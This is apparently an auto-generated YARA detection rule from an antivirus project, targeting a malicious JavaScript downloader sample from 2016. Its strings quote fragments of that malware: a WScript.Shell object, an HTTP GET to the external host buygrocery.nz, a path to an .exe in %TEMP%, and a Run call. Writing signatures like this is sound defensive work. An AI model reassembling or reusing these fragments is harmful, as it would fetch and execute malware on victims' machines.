rule sig_20160330_ef725af9f9eebcf2376d1b50d41c0b2e {
  meta:
    description = "datamaliciousorder - file 20160330_ef725af9f9eebcf2376d1b50d41c0b2e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ed2be444c76438660cc0c92473cc82263ac4cbcf76d61fe6cbc0be23edc4e9c3"

  strings:
    $s1  = "var F = function GY() {return WScript[YH](\"WScript\"+\".Shell\");}(), A0 = 11;" fullword ascii
    $s2  = "RH[QJ](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s3  = "function GT(DC, NH){YM = YM * 1; return DC - NH;};" fullword ascii
    $s4  = "if (RH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function N(){return H + \"\";};" fullword ascii
    $s6  = "function AD() {return F[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"iMQLMo1sO0.ex\" + \"e\";};" fullword ascii
    $s7  = "function K0(D){F[\"Run\"](D, YM, YM);};" fullword ascii
    $s8  = "function K() {return ((B == true) && (B == A1)) ? 1 : YM;};" fullword ascii
    $s9  = "}while (PW);" fullword ascii
    $s10 = "return GT(Z, S);" fullword ascii
    $s11 = "function ON(){return 22;};" fullword ascii
    $s12 = "function U(XK) {var PS = (1, 2, 3, 4, 5, XK); return PS;};" fullword ascii
    $s13 = "function WI()" fullword ascii
    $s14 = "function I(){return YH;};" fullword ascii
    $s15 = "var O = new this[\"Date\"]();" fullword ascii
    $s16 = "var B = false;" fullword ascii
    $s17 = "B = true; " fullword ascii
    $s18 = "var A1 = false;" fullword ascii
    $s19 = "A1 = true; " fullword ascii
    $s20 = "} catch(LX){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}